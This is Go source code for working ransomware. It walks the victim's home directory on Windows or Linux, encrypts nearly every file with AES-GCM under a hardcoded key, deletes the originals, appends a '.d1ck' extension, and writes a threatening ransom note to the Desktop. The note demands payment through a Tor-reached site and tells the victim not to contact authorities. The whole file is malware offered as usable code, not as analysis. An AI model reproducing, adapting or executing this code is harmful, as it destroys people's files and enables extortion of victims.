package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
)

func create_ransom_letter(ransom_letter_path string, op_sys string) {
	// ransom letter content
	content := `Listen up, you pathetic excuse for a human. I know you're panicking right now, but trust me, you haven't seen anything yet.
You thought your precious files were safe and secure? Maybe in your dreams, sucker. Every. Single. File. Gone.
Now you have 24 hours to pay up. If not, you'll never regain access to your data ever.
Consider it vanished into thin air, forever beyond your reach.

Don't even think about contacting authorities. 
We're watching you. And trust me, you don't want that kind of attention.

Download TOR browser from:
Open this link: https://br34ch-br4ts.netlify.app/ from the TOR browser. 
Follow the instructions.

You have one shot. Make it count.
Failure to pay up and every trace of your data will be locked away forever. Completely inaccessible. 
Consider this your only warning.
Pay up or suffer the consequences.

One more thing, you overprivileged shithead: I'm not bluffing.
You wouldn't want to find out the hard way, right?
The choice is yours.

Remember, your time is running out... Suckers.


Br34ch br4ts`

	if op_sys == "windows" {
		ransom_letter_path = ransom_letter_path + "\\READ THIS, IDIOT.txt"
	} else if op_sys == "linux" {
		ransom_letter_path = ransom_letter_path + "/READ THIS, IDIOT.txt"
	} else {
	}

	f, err := os.Create(ransom_letter_path) // create the .txt
	if err != nil {
		// log.Fatal(err)
	}
	defer f.Close()

	_, err2 := f.WriteString(content) // write inside the .txt
	if err2 != nil {
		// log.Fatal(err2)
	}
}

func encrypt_file(file_path string) {
	/* file_info, err := os.Stat(file_path) // get file information (including file size)
	if err != nil {
		// log.Fatalf("File info reading error: %v", err)
		return
	}
	if file_info.Size() < 1 { // shorter than 1 byte
		fmt.Println("Skipping file (too small):", file_path)
		return
	} */

	// open and read the file
	file_contents, err := os.ReadFile(file_path)
	if err != nil {
		// log.Fatalf("Read file error occured: %v", err.Error())
	}

	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e6f7a8b9c")

	// create a cipher block based on the secret key
	block, err := aes.NewCipher(secret_key)
	if err != nil {
		// log.Fatalf("Cipher error occured: %v", err.Error())
	}

	// create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		// log.Fatalf("Cipher GCM error: %v", err.Error())
	}

	// generate random nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		// log.Fatalf("Nonce  error: %v", err.Error())
	}

	// prepare the encrypted file contents
	enc_contents := gcm.Seal(nonce, nonce, file_contents, nil)

	// add the .d1ck extension to the current file extension
	var enc_file_path string = file_path + ".d1ck"

	// create the encrypted file
	err = os.WriteFile(enc_file_path, enc_contents, 0777)
	if err != nil {
		// log.Fatalf("Write file error: %v", err.Error())
	}

	// remove the old file
	os.Remove(file_path)
}

func explore_directory(parent_dir string) {
	err := filepath.WalkDir(parent_dir, func(file_path string, element fs.DirEntry, err error) error {
		if element.IsDir() { // it's a folder element, not a file element
			if strings.HasPrefix(element.Name(), ".") { // skip folders that start with .
				// fmt.Println("Skipping directory:", file_path)
				return filepath.SkipDir
			}
			if strings.HasPrefix(element.Name(), "AppData") { // skip AppData folder
				// fmt.Println("Skipping directory:", file_path)
				return filepath.SkipDir
			}
			// other directories
			// fmt.Println("Exploring directory:", file_path)
		} else { // it's a file
			//if strings.HasSuffix(file_path, ".d1ck") { } // already encrypted (in case the code is executed 2 or more times)
			if strings.HasSuffix(file_path, ".ini") { // if .ini don't do anything
				return nil
			}
			encrypt_file(file_path)
		}
		return nil
	})

	if err != nil {
		// log.Fatalf("Impossible to walk directory: %s", err)
	}
}

func osWindows() {
	current_user, err := user.Current()
	if err != nil {
		// log.Fatal(err)
	}
	var user_dir string = current_user.HomeDir // user path: C:\Users\this_user
	// if _, err := os.Stat(user_dir); os.IsNotExist(err) { log.Fatalf("Directory %s doesn't exist: ", user_dir) }

	explore_directory(user_dir)

	var file_path string = filepath.Join(user_dir, "/Desktop")
	create_ransom_letter(file_path, "windows")
}

func osLinux() {
	current_user, err := user.Current()
	if err != nil {
		// log.Fatalf("Error while trying to get user: ", err)
	}
	var home_dir string = current_user.HomeDir // home path: /home/thisuser
	// if _, err := os.Stat(home_dir); os.IsNotExist(err) { log.Fatalf("Directory %s doesn't exist: ", home_dir) }

	explore_directory(home_dir)

	var file_path string = filepath.Join(home_dir, "Desktop")
	create_ransom_letter(file_path, "linux")
}

func main() {
	switch runtime.GOOS {
	case "windows":
		osWindows()
	case "linux":
		osLinux()
	default: // other operating systems
	}
}
